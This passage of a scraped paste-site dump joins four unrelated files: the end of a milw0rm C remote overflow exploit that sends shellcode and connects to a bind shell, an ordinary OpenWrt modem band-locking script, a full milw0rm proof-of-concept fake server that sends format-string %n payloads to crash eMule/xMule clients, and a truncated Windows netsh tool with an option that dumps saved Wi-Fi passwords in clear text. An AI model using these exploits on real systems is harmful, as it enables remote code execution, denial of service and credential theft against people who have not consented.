      			nread=read(sock,buf,BUFLEN); 
      			write(1,buf,nread); 
     		} 
     		if(FD_ISSET(0,&input)) 
     			write(sock,buf,read(0,buf,BUFLEN)); 
  	} 
}

int usage(char *progname)
{
	int 	i;

	fprintf(stderr, ""Usage:\n./%s hostname target_num\n"");
	for (i = 0; targets[i].os; i++)
		fprintf(stderr, ""Target %d: %s\n"", i+1, targets[i].os);
	exit(-1);
}

int main( int argc, char **argv)
{

	/* first 2 bytes are a type 74 request */
	/* last two bytes length */
	char 		head[] = ""\x00\x4a\x00\x03\x00\x01\xff\xff"";
	char 		data[512];
	char		sc_req[20000];
	char		*host;
	unsigned int		tnum;
	unsigned int 	safeaddr;
	unsigned int 	ret;
	int		datalen		= LEN;
	int		port		= ARK_PORT;
	unsigned int	addr		= 0;
	int		sock_overflow, sock_nops, sock_shell;
	int 		i;

	if (argc == 3)
	{
		host = argv[1];
		tnum = atoi(argv[2]);
		if (tnum > NUMTARGS || tnum == 0)
		{
			fprintf(stderr, ""[!] Invalid target\n"");
			usage(argv[0]);
		}
	}
	else
	{
		usage(argv[0]);
	}
	
	tnum--;
	ret = targets[tnum].targret;
	safeaddr = targets[tnum].targsafe;

	sock_overflow = sock_nops = sock_shell = 0;
	sock_nops = isock(host, port);
	sock_overflow = isock(host, port);

	// build data section of overflow packet
	memset(data, 0x90, datalen);
	for (i = 0; i < datalen; i += 4)
		memcpy(data+i, (char *)&ret, 4);
	// we overwrite a pointer that must be a valid address
	memcpy(data+datalen-12, (char *)&safeaddr, 4); 

	// build header of overflow packet
	datalen = ntohs(datalen);
	memcpy(head+6, (char *)&datalen, 2);

	// build invalid packet with nops+shellcode
	memset(sc_req, 0x90, NOP_LEN+1);
	memcpy(sc_req+NOP_LEN, shellcode, sizeof(shellcode));

	// send invalid nop+shellcode packet
	fprintf(stderr, ""[*] Sending nops+shellcode\n"");
	write(sock_nops, sc_req, NOP_LEN+sizeof(shellcode)); 
	fprintf(stderr, ""[*] Done, sleeping\n"");
	sleep(1);
	close(sock_nops);

	// send overflow
	fprintf(stderr, ""[*] Sending overflow\n"");
	write(sock_overflow, head, HEAD_LEN);
	write(sock_overflow, data, LEN);
	fprintf(stderr, ""[*] Done\n"");
	fprintf(stderr, ""[*] Sleeping and connecting remote shell\n"");
	sleep (1);
	close(sock_overflow);

	// connect to shell
	sock_shell = isock(host, SHELL_PORT);
	fprintf(stderr, ""[*] Success, enjoy\n"");
	getshell(sock_shell);

}


// milw0rm.com [2003-09-20]
            "
G2uiXFqT,lock.sh,snowgum,Bash,Friday 1st of March 2024 08:29:59 PM CDT,"#!/bin/sh

ROOTER=/usr/lib/rooter
ROOTER_LINK=""/tmp/links""

log() {
	modlog ""Lock Band $CURRMODEM"" ""$@""
}

restart=$(uci -q get custom.bandlock.restart)
if [ -z ""$restart"" ]; then
	restart=""1""
fi
RESTART=""1""
if [ ""$restart"" = ""0"" ]; then
	RESTART=""0""
fi

ifname1=""ifname""
if [ -e /etc/newstyle ]; then
	ifname1=""device""
fi

fibdecode() {
	j=$1
	tdec=$2
	mod=$3
	length=${#j}
	jx=$j
	length=${#jx}

	str=""""
	i=$((length-1))
	while [ $i -ge 0 ]
	do
		dgt=""0x""${jx:$i:1}
		DecNum=`printf ""%d"" $dgt`
		Binary=
		Number=$DecNum
		while [ $DecNum -ne 0 ]
		do
			Bit=$(expr $DecNum % 2)
			Binary=$Bit$Binary
			DecNum=$(expr $DecNum / 2)
		done
		if [ -z $Binary ]; then
			Binary=""0000""
		fi
		len=${#Binary}
		while [ $len -lt 4 ]
		do
			Binary=""0""$Binary
			len=${#Binary}
		done
		revstr=""""
		length=${#Binary}
		ii=$((length-1))
		while [ $ii -ge 0 ]
		do
			revstr=$revstr${Binary:$ii:1}
			ii=$((ii-1))
		done
		str=$str$revstr
		i=$((i-1))
	done

	len=${#str}
	ii=0
	lst=""""
	sep="",""
	hun=101
	if [ $mod = ""1"" ]; then
		sep="":""
		hun=1
	fi
	if [ $mod = ""2"" ]; then
		sep="",""
		hun=1
	fi
	while [ $ii -lt $len ]
	do
		bnd=${str:$ii:1}
		if [ $bnd -eq 1 ]; then
			if [ $tdec -eq 1 ]; then
				jj=$((ii+hun))
			else
				if [ $ii -lt 9 ]; then
					jj=$((ii+501))
				else
					jj=$((ii+5001))
				fi
			fi
			if [ -z ""$lst"" ]; then
				lst=$jj
			else
				lst=$lst$sep$jj
			fi
		fi
		ii=$((ii+1))
	done
	if [ -z $lst ]; then
		lst=""0""
	fi
}

encode() {
	maskz=$1
	length=${#maskz}
	i=0
	ii=1
	lst=""""
	ij=$((length-1))
	while [ $i -le $ij ]
	do
		dgt=${maskz:$i:1}
		if [ $dgt == ""1"" ]; then
			lst=$lst$ii"" ""
		fi
		i=$((i+1))
		ii=$((ii+1))
	done
	maskz=$(encodemask $lst)
	maskz=$(echo $maskz | sed 's/^0*//')
}

maskx=$1
mask64=$(echo ""$maskx"""","" | cut -c1-64 | cut -d, -f1)
maskl2=$(echo ${maskx:64}"","" | cut -d, -f1)
maskc=$(echo ""$maskx"" | grep "","")
if [ ! -z ""$maskc"" ]; then
	mask=$(echo $maskx"","" | cut -d, -f1)
	mask5g=$(echo $maskx"","" | cut -d, -f2)
	mask5gsa=$(echo $maskx"","" | cut -d, -f3)
else
	mask=$maskx
	mask5g=""""
	mask5gsa=""""
fi

#log ""$mask""
#log ""$mask5g""
#log ""$mask5gsa""
maskxx=$mask
mask5gxx=$mask5g
mask5gsaxx=$mask5gsa

encode $mask
mask=$maskz
encode $mask5g
mask5g=$maskz
encode $mask5gsa
mask5gsa=$maskz
encode $mask64
mask64=$maskz
encode $maskl2
if [ -z $maskz ]; then
	maskl2=""0""
else
	maskl2=$maskz
fi
if [ -z $mask64 ]; then
	mask64=""0""
fi

if [ -z ""$2"" ]; then
	CURRMODEM=$(uci get modem.general.miscnum)
else
	CURRMODEM=1
fi
COMMPORT=""/dev/ttyUSB""$(uci get modem.modem$CURRMODEM.commport)
CPORT=$(uci -q get modem.modem$CURRMODEM.commport)
model=$(uci get modem.modem$CURRMODEM.model)
uVid=$(uci get modem.modem$CURRMODEM.uVid)
uPid=$(uci get modem.modem$CURRMODEM.uPid)
GW=$(uci -q get modem.modem$CURRMODEM.GW)

export TIMEOUT=""5""
case $uVid in
	""2c7c"" )
		MODT=""1""
		#if [ -z ""$2"" ]; then
		#	RESTART=""1""
		#fi
		M5=""""
		M2='AT+QCFG=""band"",0,'$mask',0'
		if [ $uPid = 0620 ]; then
			EM20=$(echo $model | grep ""EM20"")
			if [ -z ""$EM20"" ]; then #EM160
				if [ ! -z $mask ]; then
					fibdecode $mask 1 1
				else
					lst=""0""
				fi
				M2='AT+QNWPREFCFG=""lte_band"",'$lst
			else # Fake EM160 RM500
				if [ -e /etc/qfake ]; then
					if [ ! -z $mask ]; then
						fibdecode $mask 1 1
					else
						lst=""0""
					fi
					M2F='AT+QNWPREFCFG=""lte_band"",'$lst
					if [ ! -z $mask5g ]; then
						fibdecode $mask5g 1 1
					else
						lst=""0""
					fi
					M5F='AT+QNWPREFCFG=""nsa_nr5g_band"",'$lst
					NET=$(uci -q get modem.modem$CURRMODEM.netmode)
					if [ $NET = ""9"" ]; then
						M5F='AT+QNWPREFCFG=""nr5g_band"",'$lst
					fi
					log "" ""
					log ""Fake LTE Locking Cmd :  $M2F""
					log ""Fake 5G Locking Cmd :  $M5F""
					log "" ""
					#rm -f /tmp/bmask
					exit 0
				fi
			fi
		fi
		if [ $uPid = 030b ]; then
			if [ ! -z $mask ]; then
				fibdecode $mask 1 1
			else
				lst=""0""
			fi
			M2='AT+QNWPREFCFG=""lte_band"",'$lst
		fi
		if [ $uPid = 6005 ]; then
			M2='AT+QCFG=""band"",0,'$mask
		fi
		if [ $uPid = 0306 ]; then
			RESTART=""1""
		fi
		if [ $uPid = 0800 -o $uPid = 0900 -o $uPid = 0801 ]; then
			if [ ! -z ""$mask"" ]; then
				fibdecode $mask 1 1
			else
				lst=""0""
			fi
			M2='AT+QNWPREFCFG=""lte_band"",'$lst
			if [ ! -z ""$mask5g"" ]; then
				fibdecode $mask5g 1 1
			else
				lst=""0""
			fi
			M5='AT+QNWPREFCFG=""nsa_nr5g_band"",'$lst
			if [ ! -z ""$mask5gsa"" ]; then
				fibdecode $mask5gsa 1 1
			else
				lst=""0""
			fi
			M6='AT+QNWPREFCFG=""nr5g_band"",'$lst
		fi
		log "" ""
		log ""Locking Cmd : $M2""
		log ""Locking Cmd : $M5""
		log ""Locking Cmd : $M6""
		log "" ""

		ATCMDD=""AT""
		NOCFUN=$uVid
		OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M2"")
		if [ ! -z ""$M5"" ]; then
			OX5=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M5"")
		fi
		if [ ! -z ""$M6"" ]; then
			OX6=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M6"")
		fi
		log ""Locking Cmd Response : $OX""
		log ""Locking Cmd Response : $OX5""
		log ""Locking Cmd Response : $OX6""
		log "" ""
		if [ $RESTART = ""1"" ]; then
			OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
			#sleep 10
		fi
	;;
	""1199"" )
		MODT=""0""
		M1='AT!ENTERCND=""A710""'
		if [ -z $mask64 ]; then
			mask64=""0""
		fi
		flg=""0""
		case $uPid in

			""68c0""|""9041""|""901f"" ) # MC7354 EM/MC7355
				M2=""AT!BAND=11,\""Test\"",0,$mask64,0""
			;;
			""9070""|""9071""|""9078""|""9079""|""907a""|""907b"" ) # EM/MC7455
				M2='AT!BAND=11,""Test"",0,'$mask64,0
				if [ -e /etc/fake ]; then
					M2='AT!BAND=11,""Test"",0,'$mask64','$maskl2',0,0,0'
				fi
			;;
			""9090""|""9091""|""90b1"" )
				M2='AT!BAND=11,""Test"",0,'$mask64','$maskl2',0,0,0'
			;;
			""90d2""|""90d3"" )
				OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M1"")
				log ""$OX""
				m64=${maskxx:0:64}
				m32=${maskxx:64}
				encode $m64
				m64=""0000000000000000""$maskz
				m64=${m64: -16}
				encode $m32
				m32=""0000000000000000""$maskz
				m32=${m32: -16}
				M2=""AT!BAND=11,1,\""Test\"",1,$m64,$m32""
				OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M2"")
				log ""$OX""
				m64=${mask5gxx:0:64}
				m32=${mask5gxx:64}
				encode $m64
				m64=""0000000000000000""$maskz
				m64=${m64: -16}
				encode $m32
				m32=""0000000000000000""$maskz
				m32=${m32: -16}
				M2=""AT!BAND=11,1,\""Test\"",3,$m64,$m32""
				OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M2"")
				log ""$OX""
				m64=${mask5gsaxx:0:64}
				m32=${mask5gsaxx:64}
				encode $m64
				m64=""0000000000000000""$maskz
				m64=${m64: -16}
				encode $m32
				m32=""0000000000000000""$maskz
				m32=${m32: -16}
				M2=""AT!BAND=11,1,\""Test\"",4,$m64,$m32""
				OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M2"")
				log ""$OX""
				flg=""1""
			;;

		esac
		log ""$M2""
		if [ -e /etc/fake ]; then
			exit 0
		fi
		if [ ""$flg"" = ""0"" ]; then
			OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M1"")
			log ""$OX""
			OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M2"")
			log ""$OX""
		fi
		M2='AT!BAND=00;!BAND=11'
		OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$M2"")
		log ""$OX""
		if [ $RESTART = ""1"" ]; then
			ATCMDD=""AT+CFUN=1,1""
			OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
			ATCMDD='AT!ENTERCND=""AWRONG""'
		fi
		OX=$($ROOTER/gcom/gcom-locked ""/dev/ttyUSB$CPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
	;;
	""8087""|""2cb7"" )
		MODT=""2""
		FM150=""""
		if [ $uVid = 2cb7 ]; then
			FM150=$(echo $model | grep ""FM1[59]0"")
			if [ -z ""$FM150"" ]; then
				COMM=""XACT""
			else
				COMM=""GTACT""
			fi
		else
			COMM=""XACT""
		fi
		ATCMDD='AT+'$COMM'?'
		log "" ""
		log "" Get Current Bands : $ATCMDD""
		log "" ""
		OX=$($ROOTER/gcom/gcom-locked ""/dev/ttyUSB$CPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
		log "" ""
		log "" Get Current Bands Response : $OX""
		log "" ""

		lte=""""
		if [ -n ""$mask"" ]; then
			fibdecode $mask 1 0
			lte="",""$lst
			fi
		L1=""4,2,1""
		lst=""""
		if [ -n ""$FM150"" ]; then
			L1=""17,6,""
			if [ -n ""$mask5g"" ]; then
				fibdecode $mask5g 5 0
				lst="",""$lst
			else
				L1=""4,3,""
			fi
		fi
		ATCMDD=""AT+""""$COMM""=""$L1$lte$lst""
		log "" ""
		log ""Lock Command : $ATCMDD""
		log "" ""

		#exit 0

		OX=$($ROOTER/gcom/gcom-locked ""/dev/ttyUSB$CPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
		log "" ""
		log ""Lock Response : $OX""
		log "" ""
		if [ $RESTART = ""1"" ]; then
			ATCMDD=""AT+CFUN=1,1""
			OX=$($ROOTER/gcom/gcom-locked ""/dev/ttyUSB$CPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
		fi
	;;
	""413c"" )
		MODT=""3""
		case $uPid in

			""81d7""|""81d8""|""e0b4"" |""e0b5""|""1910"")
				if [ ! -z $mask ]; then
					fibdecode $mask 1 2
					ATCMDD=""AT^SLBAND=LTE,2,""""$lst""
					log ""$ATCMDD""
				else
					exit 0
				fi
				OX=$($ROOTER/gcom/gcom-locked ""/dev/ttyUSB$CPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
				log "" ""
				log ""Lock Response : $OX""
				log "" ""
				if [ $RESTART = ""1"" ]; then
					ATCMDD=""AT+CFUN=1,1""
					OX=$($ROOTER/gcom/gcom-locked ""/dev/ttyUSB$CPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
				fi
			;;
		esac
	;;
	* )
		exit 0
	;;
esac

if [ $RESTART = ""0"" ]; then
	/usr/lib/rooter/connect/bandmask $CURRMODEM $MODT
	exit 0
fi
rm -f /tmp/bmask
if [ $3 = ""12"" ]; then
	/usr/lib/rooter/luci/restart.sh $CURRMODEM 11
else
	/usr/lib/rooter/luci/restart.sh $CURRMODEM 11
fi
sleep 10
#/usr/lib/rooter/connect/bandmask $CURRMODEM $MODT
exit 0
"
sGcG1HBU,eMule/xMule/LMule - OP_SERVERMESSAGE Format String Vulnerability,FlyFar,C,Friday 1st of March 2024 08:24:52 PM CDT,"/*
 * eMule/xMule/LMule OP_SERVERMESSAGE Format String Vulnerability
 * (SecurityFocus BID 8443)
 * proof of concept code
 * version 1.0 (Aug 29 2003)
 *
 * by Rémi Denis-Courmont
 *
 * This vulnerability was found by:
 *   Stefan Esser <s.esser@e-matters.de>
 * whose original advisory may be fetched from:
 *   http://security.e-matters.de/advisories/022003.html
 *
 * Vulnerable:
 *  - eMule v0.29c -> wait for server connection timeout (!?! I need help !?!)
 *  - xMule stable v1.4.3 -> crash
 *  - xMule unstable v1.5.6a -> crash
 *  - Lmule v1.3.1 (NOT tested) -> ???
 *
 *   There is something wrong with eMule 0.29c (exception handling) and it
 * refuses to crash.
 *
 * Not vulnerable:
 *  - xMule stable v1.6.0,
 *  - eMule v0.30a.
 *
 *   As a format string vulnerability over a possibly large format input
 * buffer, experienced assembly coders (ie. NOT me) should be able to exploit
 * this vulnerability (you can find as much as 2 mega-bytes available in the
 * stack in the socket input buffer, and the message is also duplicated on
 * the heap and can be as long as 65535 bytes). However, getting clients to
 * connect to while not impossible, will be very very hard: Even though many
 * clients adds current server of other clients to their own server lists, so
 * that you can promote yourself as a server by actively connecting to others,
 * it is unlikely that your ""server"" will be selected from the list which
 * often exceeds 100 entries.
 *   Anyway, the following proof-of-concept is entirely passive, so you will
 * probably only be able to test it against yourself (which is very fine,
 * because you usually are you only legal victim).
 */


/*****************************************************************************
 * Copyright (C) 2003  Rémi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright         *
 *    notice, this list of conditions and the following disclaimer.          *
 * 2. Redistributions in binary form must reproduce the above copyright      *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *****************************************************************************/

#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>

int gai_errno = 0;

void
gai_perror (const char *str)
{
	if ((gai_errno == EAI_SYSTEM) || (gai_errno == 0))
		perror (str);
	else
		fprintf (stderr, ""%s: %s\n"", str, gai_strerror (gai_errno));
}


int
socket_listen (const char *hostname, const char *servname)
{
	struct addrinfo hints, *res;

	hints.ai_family = PF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = 0;
	hints.ai_flags = AI_PASSIVE;

	if ((gai_errno = getaddrinfo (hostname, servname, &hints, &res)) == 0)
	{
		struct addrinfo *ptr;

		for (ptr = res; ptr != NULL; ptr = ptr->ai_next)
		{
			int sock;

			sock = socket (ptr->ai_family, ptr->ai_socktype,
					ptr->ai_protocol);
			if (sock != -1)
			{
				const int val = 1;

				setsockopt (sock, SOL_SOCKET, SO_REUSEADDR,
						&val, sizeof (val));
				if (bind (sock, ptr->ai_addr, ptr->ai_addrlen)
				 || listen (sock, INT_MAX))
					close (sock);
				else
				{
					/* success! */
					freeaddrinfo (res);
					return sock;
				}
			}
		}
		freeaddrinfo (res);
	}
	return -1;
}


int
send_server_message (int fd/*, const char *message*/)
{
	/*
	 * Note that eDonkey is an Intel-centric protocol that sends/receives
	 * everything in counter-network-byte order (ie. low order first).
	 */
	uint8_t buf[] =
		""\xE3"" // protocol
		""\x70\x01\x00\x00"" // packet size
		""\x38"" // command (Server message)
		""\x6D\x01"" // message length (xMule ingores it, eMule reads it)
		""%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n""
		""Welcome to messmule, a proof-of-concept for:\n""
		""eMule/xMule/Lmule OP_SERVERMESSAGE\n""
		""Format String Vulnerability\n""
		""%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n""
		""If you can read this message from your Server info box,\n""
		""your client is probably not affected by that vulnerability.\n""
		""%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n""
		;

	return (send (fd, buf, sizeof (buf) - 1, 0) != (sizeof (buf) - 1));
}


static int
usage (const char *path)
{
	printf (
""Syntax: %s [port [hostname|IP]]\n""
""        Attempt to crash eMule/xMule/LMule clients which will connect to\n""
""        the specified server port (or 4661 by default), at the local\n""
""        host address (or any available address by default)\n"", path);

	return 2;
}


int
main (int argc, char *argv[])
{
	puts (""eMule/xMule/LMule OP_SERVERMESSAGE ""
			""Format String Vulnerabilitytion Vulnerability\n""
		""proof of concept code\n""
		""Copyright (C) 2003 Rémi Denis-Courmont ""
			""<exploit@simutrans.fr.st>\n"");
	if (argc > 3)
		return usage (argv[0]);
	else
	{
		int listenfd;
		const char *host, *port;

		port = (argc < 2) ? ""4661"" : argv[2];
		host = (argc < 3) ? NULL : argv[3];
		printf (""Binding to [%s]:%s ...\n"",
			(host != NULL) ? host : ""any"", port);
		listenfd = socket_listen (host, port);
		if (listenfd == -1)
		{
			gai_perror (host);
			return 1;
		}

		while (1)
		{
			int clientfd;

			fputs (""Waiting for a client to connect ... "", stdout);
			clientfd = accept (listenfd, NULL, 0);
			if (clientfd == -1)
			{
				puts ("""");
				perror (""Error"");
				continue;
			}
			puts (""OK"");
			fputs (""Sending server message ... "", stdout);
			if (send_server_message (clientfd))
			{
				puts ("""");
				perror (""Error"");
			}
			else
				puts (""Done"");
			close (clientfd);
		}
	}

	return 0; /* dead code */
}


// milw0rm.com [2003-09-01]
            "
YfLspj2D,netsh_all,Python253,Python,Friday 1st of March 2024 08:01:14 PM CDT,"#!/usr/bin/env python3
# Filename: netsh_all.py
# Author: Jeoi Reqi
# This script is a command-line tool for Windows network management using netsh commands, featuring a menu-driven interface for tasks like firewall settings and Wi-Fi management, providing a user-friendly solution for network operations on Windows systems.

import sys
import subprocess



'''                ::UTILITY FUNCTIONS::'''



# Utility function to run netsh commands
def run_netsh_command(command, trace_file_path=None, max_size=None):
    try:
        args = command + (['tracefile=' + trace_file_path, 'persistent=yes', f'maxsize={max_size}'] if trace_file_path and max_size else [])
        result = subprocess.run(args, capture_output=True, text=True, check=True)

        output = result.stdout.strip()
        if output:
            print(output)
            save_option_data(command[-1] if trace_file_path else ' '.join(command), output)

        else:
            print(f""No data found for '{command[-1]}'. Not saved to file (Value: None).\n"")

    except subprocess.CalledProcessError as e:
        print(""Error:"", e.stderr)


# Utility function to save data to a file
def save_option_data(option_name, data):
    if data is not None:
        print(""\nData:"")
        print(data)

        valid_choices = {'yes', 'y', 'no', 'n', '1', '2'}
        save_choice = input(
            f""Do you want to save the data from '{option_name}'?\n1. Yes (y)\n2. No (n)\nEnter your choice: "").lower()

        if save_choice in valid_choices:
            if save_choice in {'yes', 'y', '1'}:
                sanitized_option_name = ''.join(c for c in option_name if c.isalnum() or c in ('_', ' '))
                filename = f""{sanitized_option_name}.txt""
                with open(filename, 'w', encoding='utf-8') as file:
                    file.write(data)
                print(f""Data saved to '{filename}'\n"")
            else:
                print(""Data not saved.\n"")
        else:
            print(""Invalid choice. Data not saved.\n"")

        # Wait for user input before proceeding
        input(""Press Enter to continue..."")
    else:
        print(f""No data found for '{option_name}'. Not saved to file (Value: None).\n"")



'''                ::OPTION MENU FUNCTIONS::'''



# OPTION 0
def display_firewall_settings():
    run_netsh_command(['netsh', 'advfirewall', 'show', 'allprofiles'])

# OPTION 1
def check_firewall_rules():
    run_netsh_command(['netsh', 'advfirewall', 'firewall', 'show', 'rule', 'name=all'])


# OPTION 2
def check_network_interface_status():
    try:
        result = subprocess.check_output(['netsh', 'interface', 'show', 'interface'], text=True)
        return result
    except subprocess.CalledProcessError as e:
        print(f""Error checking network interface status: {e}"")
        return None


# OPTION 3
def get_wifi_profiles_and_passwords():    # Show Known Wi-Fi Network/Profiles Passwords
    # Get the Wi-Fi profiles
    command = 'netsh wlan show profiles'
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)

    # Extract profile names from the result
    profile_names = [line.split("":"")[1].strip() for line in result.stdout.splitlines() if ""All User Profile"" in line]

    # Collect data to be displayed and saved
    output_data = """"

    # Iterate through profile names and display their names and passwords
    for profile_name in profile_names:
        profile_command = f'netsh wlan show profile name=""{profile_name}"" key=clear'
        profile_result = subprocess.run(profile_command, shell=True, stdout=subprocess.PIPE, text=True)

        # Extract and collect only relevant information
        password_line = [line.strip() for line in profile_result.stdout.splitlines() if ""Key Content"" in line]
        if password_line:
            output_data += f""\nProfile: {profile_name}, Password: {password_line[0].split(':')[1].strip()}\n""
        else:
            output_data += f""Profile: {profile_name}, Password not found.\n""

    return output_data

# Display the list to the user
def show_wifi_profiles():
    profiles_output = get_wifi_profiles_and_passwords()

    # Print the collected data
    print(profiles_output)

    # Prompt the user to save the file
    save_option_data(""Wi-Fi Profiles"", profiles_output)


# OPTION 4
def get_current_wifi_info():
    try:
        result = subprocess.check_output([""netsh"", ""wlan"", ""show"", ""interfaces""], text=True)
        return result
    except subprocess.CalledProcessError as e:
        print(f""Error getting current Wi-Fi information: {e}"")
        return None
    
# OPTION 5
def check_available_wireless_connections():
    try:
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'network'], text=True)
        return result
    except subprocess.CalledProcessError as e:
        print(f""Error checking available wireless connections: {e}"")
        return None
    
# Function to extract available networks
def extract_available_wireless_networks(output):
    networks = []
    lines = output.splitlines()
    for line in lines:
        if ""SSID"" in line:
            ssid = line.split("":"")[1].strip()
            networks.append(ssid)
    return networks

# Function to display available wireless networks
def display_available_wireless_networks(networks):
    print(""\nAvailable Wireless Networks:\n"")
    for i, ssid in enumerate(networks, start=1):
        print(f""{i}. {ssid}"")


# OPTION 6            
def check_wireless_interface_details():
    try:
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], text=True)
        return result
    except subprocess.CalledProcessError as e:
        print(f""Error checking wireless interface details: {e}"")
        return None
    
    
# OPTION 7
def disconnect_wireless_device():
    run_netsh_command(['netsh', 'wlan', 'disconnect'])

# OPTION 8
def connect_to_wireless_device(selected_network):
    try:
        # Use the selected_network variable to connect to the chosen Wi-Fi network
        result = subprocess.run(['netsh', 'wlan', 'connect', f'name=""{selected_network}""'], capture_output=True, text=True, check=True)
        print(result.stdout)

        # Ask the user if they want to save the data
        save_choice = input(""\nDo you want to save the output of the connection attempt?\n1. Yes (y)\n2. No (n)\nEnter your choice: "").lower()

        if save_choice in {'yes', 'y', '1'}:
            # Generate a filename based on the function name
            filename = f""connect_to_wireless_device_output.txt""
            with open(filename, 'w', encoding='utf-8') as file:
                file.write(result.stdout)
            print(f""Data saved to '{filename}'\n"")
        else:
            print(""Data not saved.\n"")

        return result.stdout  # Return the result

    except subprocess.CalledProcessError as e:
        print(""Error connecting to the wireless network:"", e.stderr)

    # Wait for user input before proceeding to the menu
    input(""Press Enter to continue..."")
    return None  # Return None in case of an error


# Display List Of Available Networks
def select_wifi_network(networks):
    print(""\nAvailable Wireless Networks:"")
    print(""{:<5} {:<}"".format(""Num"", ""SSID""))
    for i, network in enumerate(networks, start=1):
        print(""{:<5} {:<}"".format(i, network))

    while True:
        try:
            choice = input(""\nEnter the number of the network to connect to (or press Enter to cancel): "").strip()
            if not choice:
                return None  # User pressed Enter to cancel
            else:
                choice = int(choice)
                if 1 <= choice <= len(networks):
                    return networks[choice - 1]  # Return the selected network
                else:
                    print(""Invalid choice. Please enter a valid number."")
        except ValueError:
            print(""Invalid input. Please enter a valid number."")
    
# OPTION 9   
def show_all_wireless_interfaces():
    run_netsh_command(['netsh', 'wlan', 'show', 'interfaces'])

# OPTION 10
def show_wireless_drivers():
    run_netsh_command(['netsh', 'wlan', 'show', 'drivers'])

# OPTION 11
def show_proxy_settings():
    run_netsh_command(['netsh', 'winhttp', 'show', 'proxy'])

# OPTION 12
def show_tcp_global_parameters():
    run_netsh_command(['netsh', 'interface', 'tcp', 'show', 'global'])

# OPTION 13
def show_udp_global_parameters():
    run_netsh_command(['netsh', 'interface', 'udp', 'show', 'global'])

# OPTION 14
def disable_tcp_rss():
    run_netsh_command(['netsh', 'interface', 'tcp', 'set', 'global', 'rss=disabled'])

# OPTION 15
def enable_tcp_rss():
    run_netsh_command(['netsh', 'interface', 'tcp', 'set', 'global', 'rss=enabled'])

# OPTION 16
def list_defined_aliases():
    run_netsh_command(['netsh', 'show', 'alias'])

# OPTION 17
def reset_winsock_entries():
    run_netsh_command(['netsh', 'winsock', 'reset', 'catalog'])

# OPTION 18
def reset_tcp_ip_stack():
    run_netsh_command(['netsh', 'int', 'ip', 'reset', 'reset.log'])

# OPTION 19
def set_proxy():
    proxy_address = input(""Enter the proxy address (e.g., myproxy.proxyaddress.com:8484): "")
    exceptions = input(""Enter proxy exceptions (e.g., <local>;*.proxyaddress.com): "")
    run_netsh_command(['netsh', 'winhttp', 'set', 'proxy', f'""{proxy_address}""', f'""{exceptions}""'])

# OPTION 20
def show_multicast_joins():
    run_netsh_command(['netsh', 'interface', 'ip', 'show', 'joins'])

# OPTION 21
def allow_port_firewall():
    rule_name = input(""Enter the name of the firewall rule: "")
    protocol = input(""Enter the protocol (TCP/UDP): "")
    direction = input(""Enter the direction (in/out): "")
    local_port = input(""Enter the local port: "")
